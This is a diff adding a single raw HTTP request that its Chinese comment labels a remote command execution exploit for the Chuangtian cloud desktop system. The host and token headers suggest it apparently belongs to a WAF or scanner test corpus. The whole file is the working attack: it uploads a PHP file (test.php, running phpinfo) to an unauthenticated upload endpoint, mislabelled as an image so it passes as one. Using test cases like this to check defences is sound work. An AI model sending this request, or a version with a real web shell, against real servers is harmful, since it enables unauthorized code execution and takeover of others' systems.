@@ -1,0 +1,17 @@
+# 利用【CoreChuangtianCloudDesktopSystem-RemoteCodeExcut】-80000021
+# 和信创天云桌面系统远程命令执行
+POST /Upload/upload_file.php?l=test&acid=80000021&bid=hd_tag_m8mv2487 HTTP/1.1
+Host: www.swaf.com
+Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
+RM-PRO-BusinessID: hd_tag_m8mv2487
+RM-PRO-Token: 814f98e353d0c53f0b591ef059e90d1d
+RM-PRO-Time: 1742808368323
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
+
+------WebKitFormBoundaryfcKRltGv
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: image/avif
+
+<?php phpinfo(); ?>
+------WebKitFormBoundaryfcKRltGv--
